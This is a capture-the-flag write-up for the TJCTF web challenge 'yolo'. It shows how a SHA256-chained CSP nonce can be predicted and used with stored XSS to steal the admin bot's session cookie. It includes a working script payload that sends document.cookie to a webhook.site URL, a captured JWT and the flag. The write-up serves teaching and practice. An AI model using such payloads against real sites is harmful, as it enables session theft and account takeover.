# yolo
Category: Web

## Description
I found this website that makes me really emotional because it's so motivational...

[yolo.tjc.tf/](https://yolo.tjc.tf/)

[Admin Bot](https://admin-bot.tjctf.org/yolo)

Attachments: [admin-bot.js](attachments/admin-bot.js), [server.zip](attachments/server.zip)

## Write-up
Upon navigating to the URL, we encounter the following page:

![](solution/image1.png)

When we provide the specified inputs:

![](solution/image2.png)

we receive the following result:

![](solution/image3.png)

Analyzing the page's source code, the following snippet stands out:

```
<body>

    <div id="main">
        <div>
            <h1>you  will Disturb...</h1>
            
                <h2>achieve it.</h2>

                <button id="copy">copy link to share with your friends!</button>
            
        </div>
    </div>

    <script nonce="322fe65fc25573af2aa1131d31f19b5faf50a85f94e7495b82772c969e06b9b5">
        
            document.getElementById("copy").addEventListener("click", () => {
                navigator.clipboard.writeText(window.location.href);
            });
        

        setTimeout(function () {
            document.querySelector('h1').style.opacity = 1;

            setTimeout(function () {
                document.querySelector('h2').style.opacity = 1;
            }, 2000);
        }, 1000);
    </script>
</body>
```

Apart from the generated nonce, the remaining code does not appear particularly interesting.

Examining the provided source code, we notice the following code segment:

```
app.addHook('onRequest', (req, res, next) => {
    if (!req.cookies.token) {
        req.locals = {};
        return next();
    }

    try {
        req.locals = jwt.verify(req.cookies.token, secret);
    } catch (err) {
        req.locals = {};
    }

    req.locals.nonce = req.locals.nonce ?? '47baeefe8a0b0e8276c2f7ea2f24c1cc9deb613a8b9c866f796a892ef9f8e65d';
    req.locals.nonce = crypto.createHash('sha256').update(req.locals.nonce).digest('hex');
    res.header('Content-Security-Policy', `script-src 'nonce-${req.locals.nonce}'; default-src 'self'; style-src 'self' 'nonce-${req.locals.nonce}';`);

    req.locals.userId ??= v4();

    next();
});
```

For every request made, the Content Security Policy (CSP) header is attached. Additionally, a nonce value is used, with its default value set as `47baeefe8a0b0e8276c2f7ea2f24c1cc9deb613a8b9c866f796a892ef9f8e65d`. However, the nonce value is subsequently hashed with SHA256 and updated for each request.

The following snippet demostrates how the state of our `initial_nonce` changes:

```
Request 1: sha256(initial_nonce)
Request 2: sha256(sha256(initial_nonce))
Request 3: sha256(sha256(sha256(initial_nonce)))
Request 4: sha256(sha256(sha256(sha256(initial_nonce))))
...
```

Therefore, it is crucial to keep track of the nonce state. Resetting the nonce to the initial_nonce by clearing our session cookie ensures that the nonce remains consistent when submitting our payload.

Let's attempt to specify some HTML elements and test for injection vulnerabilities:

![](solution/image4.png)

![](solution/image5.png)

As observed, our `<img>` tags are rendered on the page, indicating that the page is susceptible to Cross-Site Scripting (XSS) if we can predict the nonce value when submitting our payload.

Let's simulate the actions of the Admin bot to view what it sees. To obtain a fresh session, we need to clear our cookies. It is vital to meticulously follow the Admin's actions, as any request received by the backend will have the nonce converted.

Here is a snippet of the Admin bot's logic:

```
const page = await ctx.newPage();
await page.goto('https://yolo.tjc.tf', { waitUntil: 'domcontentloaded' });

await sleep(1000);

await page.type('#name', 'admin');
await page.type('#toDo', flag.trim());

await page.click('#submit');

await sleep(500);

await page.goto(url, { timeout: 3000, waitUntil: 'domcontentloaded' });
await sleep(3000);
```

The Admin bot first loads [https://yolo.tjc.tf](https://yolo.tjc.tf), which sets the `initial_nonce` value as `47baeefe8a0b0e8276c2f7ea2f24c1cc9deb613a8b9c866f796a892ef9f8e65d` and sha256 it, (i,e, `sha256(initial_nonce)`). Admin then submits the payload, resulting in `sha256(sha256(initial_nonce))`. Afterward, the Admin navigates to the URL of our choice. In theory, if it accesses our page, the nonce should be predicted to have the value of `sha256(sha256(sha256(initial_nonce)))` or `6cfa460c34d3b448767eb47edb9a73d03061e913cd8a7d712340ccdf8b342c36`.

Using this information, we can craft an XSS payload designed to steal cookies, incorporating the calculated nonce value:

```
</h1><script nonce="6cfa460c34d3b448767eb47edb9a73d03061e913cd8a7d712340ccdf8b342c36">location.href="https://webhook.site/2cb2e48a-7c4c-4bab-9567-1cd52ad4c253/" + document.cookie</script><h1>
```

This generates the URL [https://yolo.tjc.tf/do/81fb7dd2-bb44-4b4b-9bbd-58844944faac](https://yolo.tjc.tf/do/81fb7dd2-bb44-4b4b-9bbd-58844944faac). When we submit the URL to the Admin bot, we intercept a request on our web hook with the following URL: [https://webhook.site/2cb2e48a-7c4c-4bab-9567-1cd52ad4c253/token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE2ODU5ODY0MTYsIm5vbmNlIjoiNmNmYTQ2MGMzNGQzYjQ0ODc2N2ViNDdlZGI5YTczZDAzMDYxZTkxM2NkOGE3ZDcxMjM0MGNjZGY4YjM0MmMzNiIsInVzZXJJZCI6ImZmMThlZDE4LTEzYmMtNDM2NS04NjIwLTcyNTY5NzAzODNjMCJ9.128M5qYDtcmVNVRn32j0UcR2JRWC7S7Ob_4vIHOkdBg](https://webhook.site/2cb2e48a-7c4c-4bab-9567-1cd52ad4c253/token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE2ODU5ODY0MTYsIm5vbmNlIjoiNmNmYTQ2MGMzNGQzYjQ0ODc2N2ViNDdlZGI5YTczZDAzMDYxZTkxM2NkOGE3ZDcxMjM0MGNjZGY4YjM0MmMzNiIsInVzZXJJZCI6ImZmMThlZDE4LTEzYmMtNDM2NS04NjIwLTcyNTY5NzAzODNjMCJ9.128M5qYDtcmVNVRn32j0UcR2JRWC7S7Ob_4vIHOkdBg)


A simple base64 decode reveals the Admin's session cookie, along with the user ID `ff18ed18-13bc-4365-8620-7256970383c0`.

By accessing the Admin's URL via the user ID at [https://yolo.tjc.tf/do/ff18ed18-13bc-4365-8620-7256970383c0](https://yolo.tjc.tf/do/ff18ed18-13bc-4365-8620-7256970383c0), we can access the contents which revealed the flag.

![](solution/image7.png)

Flag: `tjctf{y0u_0n1y_1iv3_0nc3_5ab61b33}`
